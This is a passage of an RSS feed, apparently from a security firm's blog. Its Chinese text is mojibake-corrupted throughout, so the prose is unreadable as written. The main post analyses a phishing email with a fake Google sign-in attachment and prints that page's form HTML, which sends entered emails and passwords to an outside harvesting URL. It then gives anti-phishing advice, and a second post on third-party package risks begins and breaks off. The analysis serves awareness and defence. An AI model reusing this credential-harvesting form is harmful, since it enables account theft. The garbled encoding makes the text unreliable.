&lt;p&gt;é§­å®¢é–“çš„æˆ°çˆ­å·²ç¶“ä¸åªæ˜¯å€‹äººå°å€‹äººï¼Œè€Œå·²ç¶“æ“´å¤§æˆåœ‹å®¶å°åœ‹å®¶ã€‚ä¸€å€‹åœ‹å®¶ç‚ºäº†ç²å–ä»–åœ‹çš„æ©Ÿå¯†æ–‡ä»¶ã€æƒ…å ±ã€å€‹äººè³‡æ–™ç­‰ï¼Œéƒ½æœƒæƒ³ç›¡å„ç¨®è¾¦æ³•å…¥ä¾µå¸³è™Ÿã€å¯„é€æƒ¡æ„éƒµä»¶ã€é‡£é­šç›œå–å¯†ç¢¼ç­‰ã€‚è€Œèº«ç‚ºå—å®³è€…çš„æˆ‘å€‘èƒ½åšä»€éº¼å‘¢ï¼ŸGoogle å®˜æ–¹æå‡ºçš„å»ºè­°æ˜¯ï¼šåŠ å¼·å¯†ç¢¼å®‰å…¨ã€æ³¨æ„ç™»å…¥ IP ä½å€ã€æ›´æ–°è‡ªå·±ä½¿ç”¨çš„è»Ÿé«”ã€&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;é–‹å•ŸäºŒéšæ®µé©—è­‰&lt;/a&gt;ã€‚ç•¶ç„¶æœ‰è‰¯å¥½çš„è³‡å®‰æ„è­˜æ‰æ˜¯æ›´é‡è¦çš„ã€‚&lt;/p&gt;

&lt;p&gt;æ­£å¥½ä»Šå¤©æ”¶åˆ°ä¸€å€‹ç°¡å–®çš„æ¡ˆä¾‹ï¼Œæä¾›çµ¦å„ä½åƒè€ƒã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;åœ¨ä¿¡ç®±ä¸­èººè‘—ä¸€å°å¾ˆåƒæ˜¯åœ‹å¤–å®¢æˆ¶çš„ä¿¡ä»¶ã€ŒCompany Profile / Order Detailsã€ã€‚å…§å®¹çœ‹èµ·ä¾†ä¹Ÿå¾ˆæ­£å¸¸ï¼Œä¸¦ä¸”é™„ä¸Šäº†å…¬å¸çš„åŸºæœ¬è³‡æ–™ç‚ºé™„åŠ æª”æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;é‡£é­šä¿¡ä»¶&quot; title=&quot;é‡£é­šä¿¡ä»¶&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é»é–‹é™„ä»¶ï¼Œæœƒç™¼ç¾ç•«é¢å…ˆè·³äº† JavaScript è­¦å‘Šè¦–çª—å¾Œï¼Œéš¨å³å°å‘åˆ° Google ç™»å…¥é é¢ã€‚&lt;/p&gt;

&lt;p&gt;æ³¨æ„çœ‹ï¼Œé€™å€‹ç™»å…¥é é¢æ˜¯çœŸçš„å—ï¼Ÿæœ‰æ²’æœ‰ç™¼ç¾ç•«é¢ä¸Šçš„ã€ŒStay signed inã€å‰é¢çš„å‹¾è®Šæˆæ–¹æ¡†äº†ï¼Ÿç€è¦½å™¨ä¸Šçš„ç¶²å€ä¹Ÿæ˜¯åœ¨æœ¬æ©Ÿçš„ä½å€ã€‚æƒ³æƒ³çœ‹ï¼Œæ€éº¼å¯èƒ½é»äº†é™„ä»¶ä¹‹å¾Œï¼Œè·³è½‰åˆ° Google ç™»å…¥ç•«é¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;é‡£é­šä¿¡ä»¶é™„ä»¶å‡å†’ Google ç™»å…¥&quot; title=&quot;é‡£é­šä¿¡ä»¶é™„ä»¶å‡å†’ Google ç™»å…¥&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘çœ‹ä¸€ä¸‹åŸå§‹ç¢¼ï¼Œæœƒç™¼ç¾ä»–çš„ form è¢«æ”¹æˆä¸€å€‹å¥‡æ€ªçš„ç¶²å€ï¼Œçœ‹èµ·ä¾†å°±æ˜¯æƒ¡æ„ç¶²ç«™ã€‚å…¶é¤˜ç¶²é çš„éƒ¨ä»½éƒ½æ˜¯å¾ Google çœŸå¯¦çš„ç™»å…¥é é¢æŠ“å–ä¸‹ä¾†ä¿®æ”¹çš„ã€‚å› æ­¤åªè¦ä¸€ä¸æ³¨æ„ï¼Œå°±æœƒä»¥ç‚ºæ˜¯çœŸçš„ Google ç™»å…¥ç•«é¢è€Œè¼¸å…¥å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;é‡£é­šä¿¡ä»¶åŸå§‹ç¢¼&quot; title=&quot;é‡£é­šä¿¡ä»¶åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ç¯€éŒ„éƒ¨åˆ† code å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;novalidate=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://cantonfair.a78.org/yahoo/post.php&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;gaia_loginform&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;GALX&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;6UMbQQmFgwI&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;continue&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://mail.google.com/mail/&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;service&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;mail&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hl&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;en&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;scc&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;sacu&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_utf8&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;_utf8&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;â˜ƒ&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bgresponse&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;bgresponse&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;js_disabled&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pstMsg&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;pstMsg&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;dnConn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;dnConn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkConnection&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkConnection&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;youtube:424:1&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkedDomains&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;checkedDomains&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;youtube&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden-label&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Email&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;spellcheck=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;false&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;email&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;hidden-label&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Passwd&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Password&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;signIn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;signIn&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;rc-button rc-button-submit&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Sign in&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ç™¼ç¾äº†å—ï¼Ÿå…¶ä¸­ form çš„ action æ¬„ä½è¢«å–ä»£æˆã€Œ&lt;strong&gt;http://cantonfair.a78.org/yahoo/post.php&lt;/strong&gt;ã€ï¼Œè€Œé€™å€‹é é¢æœƒç›´æ¥æ¥æ”¶å—å®³è€…è¼¸å…¥çš„å¸³è™Ÿå¯†ç¢¼ï¼Œä¸¦ä¸”è‡ªå‹•è·³è½‰åˆ°çœŸæ­£çš„ Google ç™»å…¥é é¢ã€‚æ”»æ“Šè€…å¾ a78.org é€™å€‹ç¶²ç«™ä¸­ç›´æ¥å–å¾—æ‰€æœ‰è¢«é§­çš„äººè¼¸å…¥çš„å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹å¾ˆç°¡å–®ã€å…¸å‹ã€åˆæ˜“è¢«ç™¼ç¾çš„é‡£é­šæ¡ˆä¾‹ã€‚å¦‚æœä¸€æ™‚ä¸å¯Ÿä¸å°å¿ƒè¼¸å…¥äº†å¸³è™Ÿå¯†ç¢¼ï¼Œä¸‹æ¬¡å¸³è™Ÿè¢«ç›œçš„å°±æ˜¯è‡ªå·±ã€‚å»ºè­°å¤§å®¶åœ¨æ”¶å–ä¿¡ä»¶çš„æ™‚å€™éµå¾ªå¹¾å¤§åŸå‰‡ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸éš¨ä¾¿é–‹å•Ÿé™„åŠ æª”æ¡ˆï¼šé™„ä»¶å¸¸å¤¾å¸¶æƒ¡æ„ç¨‹å¼ã€åŸ·è¡Œæª”ã€æƒ¡æ„æ–‡ä»¶ã€é‡£é­šç¶²é ç­‰ï¼Œåˆ‡å‹¿éš¨ä¾¿é–‹å•Ÿã€‚å¯ä½¿ç”¨ Google Docs é–‹å•Ÿé™„ä»¶æ–‡ä»¶é˜²æ­¢æƒ¡æ„æ–‡ä»¶æ”»æ“Š Adobe PDF Readerã€Microsoft Office ç­‰ç¨‹å¼ã€‚æ›´å¸¸æœ‰æŠŠæƒ¡æ„ç¨‹å¼åŠ å¯†å£“ç¸®å¾Œå¯„å‡ºï¼Œåœ¨ä¿¡ä¸­é™„ä¸Šå¯†ç¢¼ï¼Œå€Ÿæ­¤è¦é¿é˜²æ¯’è»Ÿé«”çš„åµæ¸¬ï¼Œä¸å¯ä¸æ…ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„ä¿¡ä»¶ä¸­çš„è¶…é€£çµ URLï¼šé‡£é­šä¿¡ä»¶å¸¸åœ¨è¶…é€£çµä¸­ä½¿ç”¨æƒ¡æ„ç¶²ç«™çš„ URLï¼Œåœ¨é»é¸ä¹‹å‰å‹™å¿…ä»”ç´°æª¢æŸ¥ï¼Œæ›´è¦å°å¿ƒã€ŒGoog&lt;strong&gt;l&lt;/strong&gt;eã€åŠã€ŒGoog&lt;strong&gt;1&lt;/strong&gt;eã€ä¹‹é¡çš„è‹±æ–‡æ•¸å­—å·®ç•°ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„ä¿¡ä»¶ä¸­çš„èªæ°£ï¼šæœ‰çš„æ™‚å€™æ”»æ“Šè€…ä»¿å†’ä½ èº«é‚Šå¯ä¿¡ä»»çš„äººå¯„ä¿¡çµ¦ä½ ï¼Œä½†æ˜¯èªæ°£ã€ç”¨è©è¦éå¸¸ç²¾æº–ã€‚å¦‚æœå‡ºç¾äº†ã€Œ&lt;strong&gt;å°Šæ•¬çš„ç”¨æˆ¶æ‚¨å¥½&lt;/strong&gt;ã€ä½ å°±æœƒç™¼ç¾é€™å€‹æ‡‰è©²ä¸å¤ªåƒæ˜¯å°ç£æœ¬åœŸçš„ä¿¡ä»¶ç”¨èªã€‚&lt;/li&gt;
  &lt;li&gt;ä¸åœ¨ä¿¡ä»¶ä¸­å¤¾å¸¶æ©Ÿæ•è³‡æ–™ï¼šä¿¡ä»¶æ˜¯ä¸å®‰å…¨çš„ï¼Œåˆ‡å‹¿åœ¨ä¿¡ä¸­æåˆ°å¸³è™Ÿã€å¯†ç¢¼ã€å€‹è³‡ç­‰æ©Ÿå¯†è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;ä¸å›æ‡‰é™Œç”Ÿéƒµä»¶ï¼šéƒµä»¶ä¸­æœƒå¤¾å¸¶è‡ªå·±çš„ IP ä½å€ï¼Œå›æ‡‰ä¿¡ä»¶å¯èƒ½è®“æ”»æ“Šè€…å¾—åˆ°é€™äº›è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨å®‰å…¨çš„éƒµä»¶è»Ÿé«”ï¼šè‹¥ä½¿ç”¨å®‰å…¨çš„éƒµä»¶è»Ÿé«”ã€å¹³å°ï¼Œä¾‹å¦‚ Gmailï¼Œé‡åˆ°æƒ¡æ„éƒµä»¶æ™‚ï¼Œæœƒå³æ™‚é˜»æ“‹ä¸¦ä¸”è­¦å‘Šç”¨æˆ¶ã€‚å¦‚æœä½¿ç”¨è‡ªå·±çš„éƒµä»¶è»Ÿé«”ï¼Œå°±è¦ç‰¹åˆ¥æ³¨æ„é‡£é­šç­‰æ”»æ“Šã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é›»å­éƒµä»¶çš„æ”»æ“Šå·²ç¶“æˆç‚ºæ»²é€æ”»æ“Šä¸»è¦çš„æ‰‹æ³•ä¹‹ä¸€ï¼Œä¸å°‘åœ‹éš›è³‡å®‰äº‹ä»¶éƒ½æ˜¯è‚‡å› æ–¼æƒ¡æ„éƒµä»¶ã€‚ä¾‹å¦‚ 2013 å¹´éŸ“åœ‹ DarkSeoul äº‹ä»¶ï¼Œä»¥åŠç«„æ”¹äº¤æ˜“åŒ¯æ¬¾è³‡æ–™éƒµä»¶è©å–åŒ¯æ¬¾ç­‰ã€‚èº«ç‚ºç›®æ¨™çš„æˆ‘å€‘æ›´è¦æ™‚æ™‚æ³¨æ„ä½¿ç”¨é›»å­éƒµä»¶æ™‚çš„å®‰å…¨äº‹é …ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam/</link>
                <guid>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</guid>
                <pubDate>Mon, 31 Mar 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€è¦æ“”è² çš„è³‡å®‰é¢¨éšª</title>
                <description>&lt;p&gt;ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶ç¯€çœé–‹ç™¼æ™‚é–“ï¼Œå·²ç¶“æ˜¯æ•´å€‹è³‡è¨Šç”¢æ¥­çš„æ…£ä¾‹ã€‚ä½†æ˜¯å¾ˆå¤šç®¡ç†è€…å¯èƒ½ä¸çŸ¥é“ï¼Œä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶åˆ°åº•éœ€è¦æ“”è² å¤šå¤§çš„è³‡å®‰é¢¨éšªã€‚ä½ ç¢ºå®šä½ ç”¨çš„å¥—ä»¶æ˜¯å®‰å…¨ç„¡è™çš„å—ï¼Ÿæ˜¯å¦æœ‰ç¶“éåš´è¬¹çš„å®‰å…¨æ¸¬è©¦ï¼Ÿè‹¥æœ‰å®‰å…¨æ¼æ´å¼•çˆ†ï¼Œæ˜¯å¦æœ‰å» å•†å¯ä»¥è² è²¬ç¶­è­·ä¿®è£œï¼Ÿå» å•†é–‹ç™¼çš„ç¨‹å¼ç¢¼å“è³ªæ˜¯å¦ç©©å®šï¼Ÿé€™äº›éƒ½æ˜¯åœ¨ä½¿ç”¨ä¹‹å‰å¿…é ˆè¦è€ƒæ…®çš„ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æœå‹™çœ¾å¤šå®¢æˆ¶ä¹‹å¾Œï¼Œæˆ‘å€‘æ·±çŸ¥é€™äº›å•é¡Œçš„åš´é‡æ€§ã€‚ä»¥ä¸‹æˆ‘å€‘å°‡å°±å¹¾å€‹ç¶“å…¸çš„æ¡ˆä¾‹ä¾†èªªæ˜ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€è¦æ“”è² çš„é¢¨éšªï¼Œä¸¦ä¸”åˆ†äº«æˆ‘å€‘å°æ–¼ç¬¬ä¸‰æ–¹å¥—ä»¶çš„å®‰å…¨å»ºè­°ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç¨‹å¼ç¢¼çš„å®‰å…¨æ€§&quot;&gt;ç¨‹å¼ç¢¼çš„å®‰å…¨æ€§ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç¨‹å¼ç¢¼çš„å“è³ªç›´æ¥æ±ºå®šäº†ç³»çµ±çš„å®‰å…¨æ€§ã€‚å¦‚æœä¸€å€‹å¥—ä»¶æœ‰ä»¥ä¸‹å¹¾é»å› ç´ ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¨‹å¼é–‹ç™¼å·²ä¹…é›£ä»¥ä¿®æ”¹&lt;/li&gt;
  &lt;li&gt;é–‹ç™¼äººå“¡ç„¡å®‰å…¨è§€å¿µ&lt;/li&gt;
  &lt;li&gt;å¤§é‡æ•´åˆå¤–éƒ¨å¥—ä»¶ï¼Œç„¡æ³•æ§ç®¡æ¯å€‹å¥—ä»¶å®‰å…¨&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¯èƒ½å°±å› ç‚ºç¨‹å¼ç¢¼é›£ä»¥ä¿®æ”¹ï¼Œå½¢æˆæ¼æ´ç™¾å‡ºçš„ç¨‹å¼æ¶æ§‹ã€‚è‹¥æ˜¯ä¹‹å¾Œé™¸çºŒç™¼ç”Ÿå®‰å…¨å•é¡Œï¼Œå„˜ç®¡ä¸æ–·çš„ä¿®è£œæ¼æ´ï¼Œä½†å»æœƒå› ç‚ºç¨‹å¼ç¢¼çš„è¨­è¨ˆã€æ¶æ§‹ç­‰å› ç´ ï¼Œé€ æˆæ—¥å¾Œä¾èˆŠé™¸çºŒæœ‰å®‰å…¨ç–‘æ…®ã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ¡ˆä¾‹èªªæ˜dedecms&quot;&gt;æ¡ˆä¾‹èªªæ˜ï¼šDedeCMS&lt;/h3&gt;

